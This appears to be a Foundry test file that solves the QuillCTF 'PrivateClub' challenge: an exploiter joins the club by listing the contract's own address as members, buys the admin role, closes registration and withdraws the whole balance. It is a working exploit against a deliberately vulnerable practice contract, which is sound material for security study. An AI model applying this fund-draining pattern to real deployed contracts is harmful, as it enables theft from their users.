// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../../src/QuillCTF/PrivateClub.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract PrivateClubExploit is Test {
  PrivateClub public target;
  address public deployer = makeAddr("deployer");
  address public deployerFriend = makeAddr("deployerFriend");
  address public exploiter = makeAddr("exploiter");
  address public user1 = makeAddr("user1");
  address public user2 = makeAddr("user2");
  address public user3 = makeAddr("user3");

  function setUp() public {
    // Fund accounts.
    vm.deal(deployer, 100 ether);
    vm.deal(exploiter, 20 ether);
    vm.deal(user1, 10 ether);
    vm.deal(user2, 10 ether);
    vm.deal(user3, 10 ether);

    // Deploy the target contract.
    // Set the register end date and add a friend to the members list.
    // Also send 100 ether to the contract.
    vm.startPrank(deployer);
    target = new PrivateClub();
    target.setRegisterEndDate(block.timestamp + 5 days);
    target.addMemberByAdmin(deployerFriend);
    (bool success, ) = address(target).call{value: 100 ether}("");
    require(success, "Low-level call failed");
    vm.stopPrank();

    // User 1 becomes a member
    vm.startPrank(user1);
    address[] memory membersV1 = new address[](1);
    membersV1[0] = address(deployerFriend);
    target.becomeMember{value: 1 ether}(membersV1);
    vm.stopPrank();

    // User 2 also becomes a member
    vm.startPrank(user2);
    address[] memory membersV2 = new address[](2);
    membersV2[0] = address(deployerFriend);
    membersV2[1] = address(user1);
    target.becomeMember{value: 2 ether}(membersV2);
    vm.stopPrank();

    console2.log('Balances: target=%d ETH exploiter=%d ETH', address(target).balance / 1 ether, exploiter.balance / 1 ether);
  }

  function testExploit() public {
    vm.startPrank(exploiter);
    console2.log('Become a member of the private club');
    address[] memory members = new address[](3);
    members[0] = address(target);
    members[1] = address(target);
    members[2] = address(target);
    target.becomeMember{value: 3 ether}(members);

    console2.log('Pay to become the new owner');
    target.buyAdminRole{value: 10 ether}(exploiter);
    assertTrue(target.members(exploiter));

    console2.log('Close the registration period');
    target.setRegisterEndDate(block.timestamp - 1);
    vm.stopPrank();

    console2.log('User 3 tries to become a member without any success');
    vm.startPrank(user3);
    address[] memory newMembers = new address[](4);
    vm.expectRevert("registration closed");
    target.becomeMember{value: 4 ether}(newMembers);
    vm.stopPrank();

    console2.log('Withdraw all the funds');
    vm.startPrank(exploiter);
    target.adminWithdraw(exploiter, address(target).balance);
    vm.stopPrank();

    console2.log('Balances: target=%d ETH exploiter=%d ETH', address(target).balance / 1 ether, exploiter.balance / 1 ether);
  }
}
